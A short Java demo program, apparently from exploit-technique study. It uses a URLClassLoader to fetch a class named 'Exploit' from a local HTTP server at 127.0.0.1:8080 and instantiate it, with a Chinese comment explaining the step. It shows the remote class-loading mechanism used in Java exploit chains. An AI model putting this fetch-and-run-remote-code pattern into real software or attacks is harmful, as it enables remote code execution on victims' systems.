import java.net.URL;
import java.net.URLClassLoader;

public class urlClassloader {
    public static void main(String[] args) throws Exception{
        URL url = new URL("http://127.0.0.1:8080/");
        ClassLoader urlclassloader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());

        Class exploit = Class.forName("Exploit", true, urlclassloader);  // 通过URLClassLoader获取类，并实例化
        Object exp = exploit.newInstance();
    }
}
